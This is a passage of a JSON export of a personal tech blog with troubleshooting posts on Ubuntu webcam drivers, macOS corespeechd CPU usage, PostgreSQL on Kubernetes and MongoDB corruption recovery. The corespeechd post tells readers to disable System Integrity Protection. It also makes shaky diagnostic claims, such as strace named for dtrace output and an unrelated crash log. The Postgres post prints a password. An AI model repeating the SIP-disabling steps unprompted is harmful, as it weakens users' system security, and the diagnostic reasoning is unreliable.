Addendum: Fixing Camera Detection\\n\\nOne of the applications I use most nowadays is Zoom so I was surprised when I joined a call and saw that my camera was not detected by Zoom. I also downloaded [Cheese](https://wiki.gnome.org/Apps/Cheese) just to confirm sure that the issue wasn\u2019t specific to Zoom. I saw the same greeting: \u2018no device detected\u2019.\\nI did some research and found that there was some firmware missing for the Facetime HD (Broadcom 1570) PCIe webcam which prevented the kernel from detecting the driver. I opened up the terminal and ran the following commands to get the driver to work (you will need `git` and `curl` installed):\\n\\n```bash\\n> cd /usr/local/src\\n> sudo git clone https://github.com/patjak/bcwc_pcie.git\\n \\nCloning into \'bcwc_pcie\'...\\nremote: Enumerating objects: 8, done.\\nremote: Counting objects: 100% (8/8), done.\\nremote: Compressing objects: 100% (6/6), done.\\nremote: Total 1057 (delta 2), reused 4 (delta 0), pack-reused 1049\\nReceiving objects: 100% (1057/1057), 352.48 KiB | 537.00 KiB/s, done.\\nResolving deltas: 100% (709/709), done.\\n \\n \\n> cd /usr/local/src/bcwc_pcie\\n> sudo git clone https://github.com/patjak/facetimehd-firmware\\nCloning into \'facetimehd-firmware\'...\\nremote: Enumerating objects: 1, done.\\nremote: Counting objects: 100% (1/1), done.\\nremote: Total 886 (delta 0), reused 0 (delta 0), pack-reused 885\\nReceiving objects: 100% (886/886), 290.76 KiB | 294.00 KiB/s, done.\\nResolving deltas: 100% (585/585), done.\\n \\n> cd /usr/local/src/bcwc_pcie/facetimehd-firmware\\n> sudo make\\n \\nChecking dependencies for driver download...\\n/usr/bin/curl\\n/usr/bin/xzcat\\n/bin/cpio\\n \\nDownloading the driver, please wait...\\n \\n \\nFound matching hash from OS X, El Capitan 10.11.5\\n==> Extracting firmware...\\n --\x3e Decompressing the firmware using gzip...\\n --\x3e Deleting temporary files...\\n --\x3e Extracted firmware version 1.43.0\\n \\n> sudo make install\\nCopying firmware into \'//lib/firmware/facetimehd\'\\n \\n> cd /usr/local/src/bcwc_pcie\\n> sudo make\\nmake -C /lib/modules/5.0.0-23-generic/build M=/usr/local/src/bcwc_pcie modules\\nmake[1]: Entering directory \'/usr/src/linux-headers-5.0.0-23-generic\'\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_ddr.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_hw.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_drv.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_ringbuf.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_isp.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_v4l2.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_buffer.o\\n  CC [M]  /usr/local/src/bcwc_pcie/fthd_debugfs.o\\n  LD [M]  /usr/local/src/bcwc_pcie/facetimehd.o\\n  Building modules, stage 2.\\n  MODPOST 1 modules\\n  CC      /usr/local/src/bcwc_pcie/facetimehd.mod.o\\n  LD [M]  /usr/local/src/bcwc_pcie/facetimehd.ko\\nmake[1]: Leaving directory \'/usr/src/linux-headers-5.0.0-23-generic\'\\n \\n> sudo make install\\nmake -C /lib/modules/5.0.0-23-generic/build M=/usr/local/src/bcwc_pcie modules_install\\nmake[1]: Entering directory \'/usr/src/linux-headers-5.0.0-23-generic\'\\n  INSTALL /usr/local/src/bcwc_pcie/facetimehd.ko\\nAt main.c:160:\\n- SSL error:02001002:system library:fopen:No such file or directory: ../crypto/bio/bss_file.c:72\\n- SSL error:2006D080:BIO routines:BIO_new_file:no such file: ../crypto/bio/bss_file.c:79\\nsign-file: certs/signing_key.pem: No such file or directory\\n  DEPMOD  5.0.0-23-generic\\nWarning: modules_install: missing \'System.map\' file. Skipping depmod.\\nmake[1]: Leaving directory \'/usr/src/linux-headers-5.0.0-23-generic\'\\n```\\n\\nDon\u2019t worry too much about the SSL errors above, they are red herrings.\\nI then needed to load the drivers into the kernel:\\n\\n```bash\\n> sudo depmod\\n> sudo modprobe -r bdc_pci\\n> sudo modprobe facetimehd\\n```\\n\\nI relaunched Cheese and saw my messy face on the camera \ud83d\ude42\\nBut once I restarted the computer, I saw that the changes were reverted. I needed to persist them somehow. After some more research, I found that I needed to add `facetimehd` to the kernel modules that are loaded during boot time:\\n\\n```bash\\n> sudo echo facetimehd >> /etc/modules\\n```\\n\\nAfter restarting, I saw that I was able to detect my camera in Zoom and Cheese!"},{"id":"macbook-pro-2020-high-cpu-caused-siri","metadata":{"permalink":"/blog/macbook-pro-2020-high-cpu-caused-siri","source":"@site/blog/macbook-pro-2020-high-cpu-caused-siri.md","title":"MacBook Pro 2020 High CPU caused by\xa0Siri","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Apple","permalink":"/blog/tags/apple"},{"inline":false,"label":"Corespeechd","permalink":"/blog/tags/corespeechd"},{"inline":false,"label":"Cpu","permalink":"/blog/tags/cpu"},{"inline":false,"label":"Debugging","permalink":"/blog/tags/debugging"},{"inline":false,"label":"Macos","permalink":"/blog/tags/macos"}],"readingTime":6.43,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"macbook-pro-2020-high-cpu-caused-siri","title":"MacBook Pro 2020 High CPU caused by\xa0Siri","description":"Fill me up!","authors":["kbbgl"],"tags":["apple","corespeechd","cpu","debugging","macos"]},"unlisted":false,"prevItem":{"title":"Installing Ubuntu 20.04 on 2013 MacBook\xa0Air","permalink":"/blog/installing-ubuntu-2004-on-2013-macbook-air"},"nextItem":{"title":"Deploying PostgresSQL in Kubernetes","permalink":"/blog/pgsql-k8s"}},"content":"## Introduction\\n\\nA few months ago, I received a highly-anticipated 2020 32GB, 2.3 GHz Quad-Core Intel Core i7 MacBook Pro. Highly-anticipated because I already had one stolen (a 2019 version) earlier last year in a robbery in an AirBnB apartment I was renting while I was staying in Barcelona. It was quite a dramatic story but I won\u2019t get into the details. This is a tech blog after all.\\n\\n\x3c!-- truncate --\x3e\\n\\nBack to the new computer I acquired, the thing was flying. I could open large projects in IntelliJ and VSCode, run a Kubernetes cluster using [`minikube`](https://minikube.sigs.k8s.io/docs/start/) and endless amounts of terminals simultaneously on different workspaces and the thing would not miss a beat.\\n\\nWithin the first week of receiving machine, I got a notification indicating that there was a system update. I never had any fears come with system updates. I always found myself jumping ship and hoping no regressions or new issues are introduced upon upgrades/updates. I\u2019m not a skeptic, I believe Apple\u2019s QA is up to the highest testing standards.\\n\\nAnyway, I let the update run for a few hours and after a couple of restarts, the OS was back up and could work on the machine again.\\n\\nPretty soon thereafter, I heard the machine fan working intensively and the low-carbon aluminum enclosure was excessively hot. I also noticed that I the interaction with the OS and applications was crawlingly-slow. I even had the machine crash 2-3 times! I decided I had enough and that it was time to put on my Sherlock Holmes hat and start the investigation.\\n\\n## Finding the Culprit Process\\n\\nIt makes sense that the first place to review would be Activity Monitor. It allows us to check the amount of energy each running process is utilizing in addition to CPU cycles and RAM allocation. Below is the screenshot of what I saw after launching Activity Monitor:\\n\\n![activity-monitor](https://tilsupport.files.wordpress.com/2021/03/image.png)\\n\\nWe can see that the top process, `ZscalerTunnel` was really using up the CPU. I knew what this process belonged to (a VPN service). I was able to fix the `ZscalerTunnel` CPU hog by installing the latest version of the application and restarting the machine.\\n\\nBut the second process, `corespeechd` was not letting go and was at times using between 3 to 4 CPUs (300-400%). And the worst part was that I had no idea what `corespeechd` was (aside from a guess that it was some sort of daemon because of the letter \u2018d\u2019 in the suffix).\\n\\n## What is `corespeechd`?\\n\\nThis question was hard to find online. I believe because I am not a registered Apple developer, I could not see any relevant documentation about this process/service. What I did find was that many people had a problem with this daemon hogging machine resources such as [massive network utilization (1)](https://discussions.apple.com/thread/8643914?page=2) and [massive network utilization (2)](https://discussions.apple.com/thread/250955260?page=2). And I also found a lot of people experiencing the [high CPU consumption](https://forums.macrumors.com/threads/cpu-usage-corespeechd.2158710/) and on [Twitter as well](https://twitter.com/alecmuffett/status/1089721018015539200?lang=en).\\n\\nAccording to the online research, all fingers were pointing to one feature: Siri. In addition, all recommendations to mitigate this issue mentioned disabling/enabling or turning off Siri completely. Unfortunately for me, corespeechd was still causing problems after my attempt to disable Siri.\\nSince the machine had crashed a few times, I decided the next step would be to review the system crash report.\\nWhat I found was that the OS crashed because of a segmentation fault:\\n\\n```bash\\nCrashed Thread:        0  Dispatch queue: com.apple.main-thread\\n\\nException Type:        EXC_BAD_ACCESS (SIGSEGV)\\nException Codes:       KERN_INVALID_ADDRESS at 0x0000000108745050\\nException Note:        EXC_CORPSE_NOTIFY\\n\\nTermination Signal:    Segmentation fault: 11\\nTermination Reason:    Namespace SIGNAL, Code 0xb\\nTerminating Process:   exc handler [11719]\\n\\nThread 0 Crashed:: Dispatch queue: com.apple.main-thread\\n0   libobjc.A.dylib                0x00007fff202639af objc_release + 15\\n1   com.apple.CoreFoundation       0x00007fff20478a76 -[__NSDictionaryI dealloc] + 146\\n2   libobjc.A.dylib                0x00007fff2028139d AutoreleasePoolPage::releaseUntil(objc_object**) + 167\\n3   libobjc.A.dylib                0x00007fff2026433e objc_autoreleasePoolPop + 161\\n4   com.apple.CoreFoundation       0x00007fff2047e1f0 _CFAutoreleasePoolPop + 22\\n5   com.apple.CoreFoundation       0x00007fff20587748 __CFRunLoopPerCalloutARPEnd + 41\\n6   com.apple.CoreFoundation       0x00007fff204bc88b __CFRunLoopRun + 2788\\n7   com.apple.CoreFoundation       0x00007fff204bb6ce CFRunLoopRunSpecific + 563\\n8   com.apple.Foundation           0x00007fff21248fa1 -[NSRunLoop(NSRunLoop) runMode:beforeDate:] + 212\\n9   com.apple.Foundation           0x00007fff212d7384 -[NSRunLoop(NSRunLoop) run] + 76\\n10  com.apple.authorizationhost    0x0000000108661727 main + 302\\n11  libdyld.dylib                  0x00007fff203e0621 start + 1\\n```\\n\\nWhat was immediately visible was that there were instructions in memory address `0x00007fff20478a76` that were being allocated by the `com.apple.CoreFoundation` package. This gave me the evidence I needed that tied the system crash to the issues witnessed by the `Core` services.\\n\\nI decided to run `corespeechd` using `strace` so I could see what system calls the process was executing during run-time. I found the following output indicating there was some permission issues attempting to access a certain process probe:\\n\\n```bash\\ndtrace: error on enabled probe ID 2378 (ID 918: syscall::kevent_id:return): invalid user access in action #5 at DIF offset 0\\ndtrace: error on enabled probe ID 2385 (ID 904: syscall::workq_kernreturn:return): invalid user access in action #5 at DIF offset 0\\n```\\n\\n## Using `launchctl` to Disable `corespeechd`\\n\\nSince Siri was already off, I was pretty sure that if I found a way to completely disable `corespeechd`, I would be able to release the daemon from eating up my processors.\\n\\nI am familiar with using `systemctl` and `init.d` on Linux to be able to control system services. On Windows I usually just use the `Stop-Service` PowerShell cmdlet. But for Mac I wasn\u2019t sure what command line tool needs to be used. I found out that the preferred way is to use `launchctl`.\\n\\nI also wanted to understand where MacOS startup scripts are stored. I found out that there were 5 different directories:\\n\\n- `/System/Library/LaunchDaemons/`\xa0\u2013 System-wide daemons provided by the operating system.\\n- `/System/Library/LaunchAgents/`\xa0\u2013 Per-user agents provided by the operating system.\\n- `~/Library/LaunchAgents/`\xa0\u2013 Per-user agents provided by the user.\\n- `/Library/LaunchAgents/`\xa0\u2013 Per-user agents provided by the administrator.\\n- `/Library/LaunchDaemons/`\xa0\u2013 System-wide daemons provided by the administrator.\\n\\n`launchd` manages the processes, both for the system as a whole and for individual users using configuration files with the `.plist` extension.\\n\\nI reviewed the `launchctl` `man` page and found that we can disable a service by using the `unload` command, for example:\\n\\n```bash\\nsudo launchctl unload -w com.apple.corespeechd\\n```\\n\\nThat looked great! The `corespeechd` daemon was no longer running and my CPU was back to normal consumption. Unfortunately, I realized my celebrations were premature when I restarted my machine. `corespeechd` was back up and feasting on my machine resources again.\\n\\nI went back to the `launchctl man` page and found that there was another option, `remove`, that could do the trick as it seemed to perform a persistent disabling of services (unlike the `unload` operation which was temporary until system restart relaunched all daemons). The problem was that I was unable to run the command:\\n\\n```bash\\nsudo launchctl remove com.apple.corespeechd\\n```\\n\\nbecause the operating system had [System Integrity Protection (SIP)](https://support.apple.com/en-us/HT204899) enabled. I found that I could use the csrutil command-line tool to interact with SIP. To interact with SIP, we need to go into Recovery Mode.\\n\\ntl;dr ,these are the steps I took to completely disable `corespeechd`:\\n\\n1. Reboot the machine.\\n1. Press and hold `Command\xa0+ R`.\\n1. Once the Recovery menu loads up, in the top menu bar, select `Utilities > Terminal`.\\n1. Run the following command to disable System Integrity\xa0Protection (SIP):\\n\\n```bash\\ncsrutil disable\\n```\\n\\n1. Reboot the machine.\\n1. Press and hold Command\xa0+ R.\\n1. Once the Recovery menu loads up, in the top menu bar, select Utilities > Terminal.\\n1. Run the following command to disable System Integrity\xa0Protection (SIP):\\n\\nYou should see the following message to acknowledge that SIP was actually disabled:\\n\\n```bash\\nSystem Integrity Protection status: disabled.\\n```\\n\\n1. Reboot the machine.\\n1. When OS loads, open a Terminal and run the following command to disable\xa0`corespeechd`\xa0daemon:\\n\\n```bash\\nsudo launchctl remove com.apple.corespeechd\\n```\\n\\nYou should see that\xa0corespeechd\xa0daemon is no longer running and consuming massive CPU!"},{"id":"pgsql-k8s","metadata":{"permalink":"/blog/pgsql-k8s","source":"@site/blog/pgsql-k8s.md","title":"Deploying PostgresSQL in Kubernetes","description":"Deploying a PostgresSQL database in a Kubernetes cluster","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"K8s","permalink":"/blog/tags/k-8-s"},{"inline":false,"label":"Kubernetes","permalink":"/blog/tags/kubernetes"},{"inline":false,"label":"Database","permalink":"/blog/tags/database"},{"inline":false,"label":"Storage","permalink":"/blog/tags/storage"},{"inline":false,"label":"Postgres","permalink":"/blog/tags/postgres"},{"inline":false,"label":"Web","permalink":"/blog/tags/web"},{"inline":false,"label":"Webapplication","permalink":"/blog/tags/webapplication"},{"inline":false,"label":"Webdevelopment","permalink":"/blog/tags/webdevelopment"}],"readingTime":1,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal (Akeyless)","title":"Senior Escalations Engineer at Akeyless","url":"https://github.com/kgal-akl","imageURL":"https://avatars.githubusercontent.com/u/195813801","key":"kgal-akl","page":null}],"frontMatter":{"slug":"pgsql-k8s","title":"Deploying PostgresSQL in Kubernetes","description":"Deploying a PostgresSQL database in a Kubernetes cluster","authors":["kgal-akl"],"tags":["k8s","kubernetes","database","storage","postgres","web","webapplication","webdevelopment"]},"unlisted":false,"prevItem":{"title":"MacBook Pro 2020 High CPU caused by\xa0Siri","permalink":"/blog/macbook-pro-2020-high-cpu-caused-siri"},"nextItem":{"title":"Fixing Production Down caused by MongoDB Corruption and Heketi/GlusterFS Failed\xa0Provisioning","permalink":"/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning"}},"content":"In this tutorial we deploy a PostgresSQL database in Kubernetes cluster.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Set Up Postgres\\n\\nWe first create a new namespace to hold the database-related services.\\n\\n```bash\\nkubectl create namespace database\\nkubectl config set-context --current --namespace database\\n```\\n\\nThe first step is to create a `PersistenceVolume` and `PersistentVolumeClaim`:\\n\\n```yaml title\\napiVersion: v1\\nkind: PersistentVolume\\nmetadata:\\n  name: postgresql-pv\\n  labels:\\n    type: local\\nspec:\\n  storageClassName: manual\\n  capacity:\\n    storage: 1Gi\\n  accessModes:\\n    - ReadWriteOnce\\n  hostPath:\\n    path: \\"/mnt/data\\"\\n\\n---\\napiVersion: v1\\nkind: PersistentVolumeClaim\\nmetadata:\\n  name: postgresql-pv-claim\\nspec:\\n  storageClassName: manual\\n  accessModes:\\n    - ReadWriteOnce\\n  resources:\\n    requests:\\n      storage: 1Gi\\n```\\n\\nWe add them to the namespace:\\n\\n```bash\\nkubectl apply -f pgsql-pv.yaml&&kubectl apply -f pgsql-pvc.yaml\\n```\\n\\nWe then install Postgres using the `bitnami/postgresql` chart:\\n\\n```bash\\nhelm install psql-test bitnami/postgresql \\\\\\n    --set persistence.existingClaim=postgresql-pv-claim \\\\\\n    --set volumePermissions.enabled=true \\\\\\n    --set primary.service.type=LoadBalancer\\n```\\n\\nWe can check that the database service is set up correctly by connecting to it using the `psql` client:\\n\\n```bash\\nexport POSTGRES_PASSWORD=$(kubectl get secret --namespace database psql-test-postgresql -o jsonpath=\\"{.data.postgres-password}\\" | base64 -d)\\n\\necho $POSTGRES_PASSWORD\\nPGDeiuKIDd\\n\\nkubectl run psql-test-postgresql-client-2 \\\\\\n    --rm \\\\\\n    --tty \\\\\\n    -i \\\\\\n    --restart=\'Never\' \\\\\\n    --namespace database \\\\\\n    --image docker.io/bitnami/postgresql:16.4.0-debian-12-r0 \\\\\\n    --env=\\"PGPASSWORD=$POSTGRES_PASSWORD\\" \\\\\\n    --command \\\\ \\n    -- psql --host psql-test-postgresql -U postgres -d postgres -p 5432\\n```"},{"id":"prod-down-mongodb-corrupt-heketi-glusterfs-provisioning","metadata":{"permalink":"/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning","source":"@site/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning.md","title":"Fixing Production Down caused by MongoDB Corruption and Heketi/GlusterFS Failed\xa0Provisioning","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Cluster","permalink":"/blog/tags/cluster"},{"inline":false,"label":"Gluster","permalink":"/blog/tags/gluster"},{"inline":false,"label":"Glusterfs","permalink":"/blog/tags/glusterfs"},{"inline":false,"label":"Heketi","permalink":"/blog/tags/heketi"},{"inline":false,"label":"Kubectl","permalink":"/blog/tags/kubectl"},{"inline":false,"label":"Kubernetes","permalink":"/blog/tags/kubernetes"},{"inline":false,"label":"Mongo","permalink":"/blog/tags/mongo"},{"inline":false,"label":"Mongodb","permalink":"/blog/tags/mongodb"},{"inline":false,"label":"Production","permalink":"/blog/tags/production"},{"inline":false,"label":"Troubleshooting","permalink":"/blog/tags/troubleshooting"}],"readingTime":10.625,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"prod-down-mongodb-corrupt-heketi-glusterfs-provisioning","title":"Fixing Production Down caused by MongoDB Corruption and Heketi/GlusterFS Failed\xa0Provisioning","description":"Fill me up!","authors":["kbbgl"],"tags":["cluster","gluster","glusterfs","heketi","kubectl","kubernetes","mongo","mongodb","production","troubleshooting"]},"unlisted":false,"prevItem":{"title":"Deploying PostgresSQL in Kubernetes","permalink":"/blog/pgsql-k8s"}},"content":"## Introduction\\n\\nToday I received an escalation from one of our largest and most strategic customers. Over the weekend, the customer had \u2018patched\u2019 their 3 Ubuntu 18.04 nodes running Kubernetes 1.17.  They were using [`glusterfs`](https://www.gluster.org/) as their shared storage class.\\n\\n\x3c!-- truncate --\x3e\\n\\nI was trying to figure out what this \u2018patching\u2019 job entailed so we could assess which step of the maintenance to focus on but could not get all the necessary details from the customer support team except for the following order of operations:\\n\\n1. They ran `kubectl drain` to prepare their 3 nodes for the patching. This ensured that all `Pods` would get evicted, including all persistent storage and services.\\n1. They ran kernel updates to patch security vulnerabilities.\\n1. They upgraded Ubuntu packages using `apt update&&apt upgrade`.\\n1. They restarted all their servers and ran `kubectl uncordon`.\\n\\nAfter they finished this maintenance job, their application was no longer loading.\\nThey had not taken any snapshots of the system before running this \u2018patch\u2019 job so we had to figure out why the application was not available.\\n\\n## Salvaging MongoDB\\n\\nI invited the customer to join me on a conference call so I could take a look and gather preliminary information about why the application is not running.\\nWhat I noticed when running `kubectl get pods` was that all the services were stuck on `Init 0/1`, which indicated that the execution of the first `initContainer` was terminating with non-zero return codes. All `initContainer`s were failing their connection to MongoDB as we can see from the spec of one of the `Pods` which was stuck on `Init`:\\n\\n```yaml\\nInit Containers:\\n\xa0\xa0init-mongodb:\\n\xa0\xa0\xa0\xa0Image:         busybox:1.30.1\\n\xa0\xa0\xa0\xa0Command:\\n\xa0\xa0\xa0\xa0\xa0\xa0sh\\n\xa0\xa0\xa0\xa0\xa0\xa0-c\\n\xa0\xa0\xa0\xa0\xa0\xa0until nc -zv mongodb-service.prod 27017; do echo waiting for mongodb; sleep 2; done;\\n```\\n\\nIt was pretty evident that the MongoDB service was the cause for the dependent application services inability to initialize because we saw that all 3 replica set member\u2019s `Pod`s were in `Init: CrashLoopBackOff` state.\\n\\nWe needed to understand which `initContainer` of MongoDB was crashing. We were able to figure out why using `kubectl describe pod mongodb-replicaset-0` and `kubectl logs mongodb-replicaset-0 --all-containers`.\\nWhen running `kubectl describe pod mongodb-replicaset-0` we saw that the failing `initContainer` was one called `bootstrap`:\\n\\n```yaml\\nInit Containers:\\nbootstrap:\\n\xa0\xa0\xa0\xa0Image:         mongo:3.6.8\\n\xa0\xa0\xa0\xa0Command:\\n\xa0\xa0\xa0\xa0\xa0\xa0/work-dir/peer-finder\\n\xa0\xa0\xa0\xa0Args:\\n\xa0\xa0\xa0\xa0\xa0\xa0-on-start=/init/on-start.sh\\n\xa0\xa0\xa0\xa0\xa0\xa0-service=mongodb-replicaset\\n\xa0\xa0\xa0\xa0Environment:\\n\xa0\xa0\xa0\xa0\xa0\xa0REPLICA_SET:    rs0\\n\xa0\xa0\xa0\xa0\xa0\xa0TIMEOUT:        900\\n```\\n\\nThis container is a simple peer finder daemon that is useful with `StatefulSet` and related use cases.\\nAll it does is watch DNS for changes in the set of endpoints that are part of the governing service. It periodically looks up the SRV record of the DNS entry that corresponds to a Kubernetes Service which enumerates the set of peers for this the specified service. Not really helpful. So we needed to review the logs and find out what\u2019s causing this container to fail.\\n\\nWhen we ran `kubectl logs mongod-replicaset-0 --all-containers` we noticed the following error:\\n\\n```text\\nE STORAGE  WiredTiger error, file:WiredTiger.wt, connection: unable to read root page from file:WiredTiger.wt: WT_ERROR: non-specific WiredTiger error\\nE STORAGE  WiredTiger error, file:WiredTiger.wt, connection: WiredTiger has failed to open its metadata\\nE STORAGE  WiredTiger error, file:WiredTiger.wt, connection: This may be due to the database files being encrypted, being from an older version or due to corruption on disk\\nE STORAGE  WiredTiger error, file:WiredTiger.wt, connection: You should confirm that you have opened the database with the correct options including all encryption and compression options\\nE -        WT_ERROR: non-specific WiredTiger error src\\\\mongo\\\\db\\\\storage\\\\wiredtiger\\\\wiredtiger_kv_engine.cpp 397\\nI STORAGE  WT_ERROR: non-specific WiredTiger error, terminating\\n```\\n\\nThe log that immediately grabbed our attention was the following:\\n\\n```text\\nE STORAGE  WiredTiger error, file:WiredTiger.wt, connection: This may be due to the database files being encrypted, being from an older version or due to corruption on disk\\n```\\n\\nAlthough we did not have any incriminating evidence, we were pretty sure that the server patching likely caused some data disk corruption because of an unclean shutdown of the MongoDB service.\\nAt this point we were facing a few of problems:\\n\\n1. We could not create a mongodump since the MongoDB server was not running and the `initContainers` were in a `CrashLoopBackOff`.\\n1. We did not have the necessary tools on the production environment since we could not install any additional sidecar containers or utilities.\\n1. As mentioned earlier, we did not have a snapshot of the server in a working state or a `mongodump` to rely on so we needed to figure out a way to fix this corrupted state somehow.\\n\\nLuckily, the environment did have a `Deployment` called `system-recovery` which allowed us access to the mounted storage points so we could access the MongoDB flat files. We could then take these flat files, compress them and transfer them to our lab environment to attempt recovery:\\n\\n```bash\\n> kubectl scale deployment system-recovery --replicas=1\\ndeployment.apps/system-recovery scaled\\n> kubectl cp system-recovery-4184bfa40da-sah4131:/mongodb0 /tmp/mongodb0\\n> tar czvf /tmp/mongodb0.tar.gz /tmp/mongodb0\\n```\\n\\nIn our lab, we attempted to load MongoDB with the `--repair` flag but saw that it was failing with the same error we saw earlier on the production environment:\\n\\n```bash\\n> mongod --version\\n3.6.8\\n> mongod --dbpath=/tmp/mongodb0 --repair\\nE STORAGE  WiredTiger error, file:WiredTiger.wt, connection: This may be due to the database files being encrypted, being from an older version or due to corruption on disk\\n```\\n\\nWe found out, after further research, that [MongoDB version 4 had a more robust repairing mechanism of corrupted WiredTiger schemas](https://jira.mongodb.org/browse/SERVER-19815). So we installed MongoDB 4 in our lab environment and reran the same repair:\\n\\n```bash\\n> mongod --version\\n4.2.2\\n> mongod --dbpath=/tmp/mongodb0 --repair\\n```\\n\\nWe received a message that the operation was successful!\\nSo now that we had a repaired MongoDB, we wanted to create a `mongodump` and then attempt to load the database in the lab environment to check whether the dependent Pods will successfully load which would mean that the application would load as well.\\n\\n## MongoDB Version Conflict\\n\\nEarlier, When attempting to repair the MongoDB, we needed to run the MongoDB server with version 4+ because of the new repair mechanism offered. The actual data which we extracted from the production environment was from version 3.6.8. We didn\u2019t think this would be a problem until we actually attempted to load the database in order to generate a `mongodump`:\\n\\n```bash\\n> mongod --version\\n3.6.8\\n> mongod --dbpath=/tmp/mongodb0\\n...\\nFound an invalid featureCompatibilityVersion document (ERROR: BadValue: Invalid value for version, found 3.6, expected \'4.2\' or \'4.0\'. Contents of featureCompatibilityVersion document in admin.system.version: { _id: \\"featureCompatibilityVersion\\", version: \\"3.6\\" }. See http://dochub.mongodb.org/core/4.0-feature-compatibility.). If the current featureCompatibilityVersion is below 4.0, see the documentation on upgrading at \\n```\\n\\nWe were now blocked because MongoDB server and the actual data were different versions. We could not run the command:\\n\\n```javascript\\ndb.setFeatureCompatibility({_id: version\\"3.6\\"})\\n```\\n\\nas suggested by a few different StackOverflow articles and MongoDB official documentation since we would need to be able to run the database.\\n\\nThis was really bad news since we did not know where this feature flag was actually stored, whether it was stored in clear text and if it was accessible. We decided to run a quick search within all the flat files in the MongoDB directory. It was a shot in the dark but we didn\u2019t really have any other options at this point.\\n\\n```bash\\n> grep -rnwi \\"compatibility\\" ./mongodb0/*\\nWiredTiger.turtle:1:Compatibility version\\n```\\n\\nWe managed to find something interesting within the WiredTiger.turtle file which was clear text. The whole file contents looked like this:\\n\\n```text\\nCompatibility version\\nmajor=4,minor=2\\nWiredTiger version string\\nWiredTiger 4.2.1: (September 15, 2019)\\nWiredTiger version\\nmajor=4,minor=2,patch=1\\n```\\n\\nSince we were in dire straits, we decided it was worth to modify the versions in this file and see if we could work around the MongoDB server validation. We modified it to the following:\\n\\n```text\\nCompatibility version\\nmajor=3,minor=6\\nWiredTiger version string\\nWiredTiger 3.6.8: (July 12, 2018)\\nWiredTiger version\\nmajor=3,minor=6,patch=8\\n```\\n\\nMiraculously, when running MongoDB daemon again, we were able to load the database and the application! We created a dump file using `mongodump` and transferred it to the production environment.\\n\\n## Fixing Unhealthy GlusterFS/Heketi\\n\\nWe reconnected to the production environment, transferred the repaired and generated `mongodump` and we needed to somehow restore it onto the shared storage. We saw three possible ways of performing this:\\n\\n1. Modify the MongoDB `StateFulSet` specification by changing the executed commands to something like an infinite sleep so that the `bootstrap` `initContainer` would not terminate. This would allow us to copy the `mongodump` into the container and run `mongorestore` to load the repaired databased and ensure it\u2019s replicated across all GlusterFS storage locations. This was the preferred option.\\n1. Replace all MongoDB flat files manually within each one of the GlusterFS shared storage locations. This would not be ideal since it would go against MongoDB replication best practices.\\n1. Removing all GlusterFS `PersistentVolumeClaims`, recreate them from scratch and then bind them to the MongoDB replica set members.\\n\\nAfter reviewing all three options, we decided to go with the 3rd approach. It was decided as the best option after consulting with our DevOps because they mentioned that they have set up dynamic storage allocation upon removal of the GlusterFS `PersistenVolumeClaims` and restart of the MongoDB `StateFulSet` `Pod`s.\\nThe first step would be to delete the `PersistentVolumeClaims`. So we went to work.\\n\\n```bash\\n> kubectl delete pvc datadir-mongodb-replicaset-0\\n> kubectl delete pvc datadir-mongodb-replicaset-1\\n> kubectl delete pvc datadir-mongodb-replicaset-2\\n```\\n\\nBut we noticed that these pvcs were stuck on Terminating. We even attempted to force delete them but they were still stuck:\\n\\n```bash\\n> kubectl delete pvc datadir-mongodb-replicaset-0 --force --grace-period 0\\n```\\n\\nAfter some research, we found out that these PersistentVolumeClaim specs had [`finalizers`](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#finalizers):\\n\\n```bash\\n> kubectl describe pvc datadir-mongodb-replicaset-0\\n\\nName:          datadir-mongodb-replicaset-0\\nNamespace:     prod\\nStorageClass:  gluster\\nStatus:        Bound\\nVolume:        pvc-64340467-8109-4856-9a49-2fc36563e9ab\\nLabels:        app=mongodb-replicaset\\nAnnotations:   pv.kubernetes.io/bind-completed: yes\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0pv.kubernetes.io/bound-by-controller: yes\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0volume.beta.kubernetes.io/storage-provisioner: kubernetes.io/glusterfs\\nFinalizers:    [kubernetes.io/pvc-protection]\\nCapacity:      150Gi\\nAccess Modes:  RWO\\nVolumeMode:    Filesystem\\nMounted By:    mongodb-replicaset-0\\nEvents:        <none>\\n```\\n\\nWe edited the `PVC`s with:\\n\\n```bash\\nkubectl edit pvc datadir-mongodb-replicaset-0\\n```\\n\\nremoved the `finalizer` section and reran the `kubectl delete pvc` commands. This resulted in a successful deletion. We then deleted the MongoDB `StateFulSet` to generate the `PVC`s using `kubectl delete pod mongodb-replicaset-{0,1,2}`. But to our surprise, the `PVC` and the `Pod`s were stuck `Pending`. Something was preventing the dynamic `PVC` allocation.\\n\\nWhen we ran `kubectl describe pvc datadir-mongodb-replicaset-0` we saw that there was an `Event` with `ProvisioningFailed` with the following error message:\\n\\n```bash\\n> kubectl describe pvc datadir-mongodb-replicaset-0\\nFailed to provision volume with StorageClass \\"gluster\\": failed to create volume.\\n```\\n\\nThe error message was far from informative so we needed to step back and review the state of 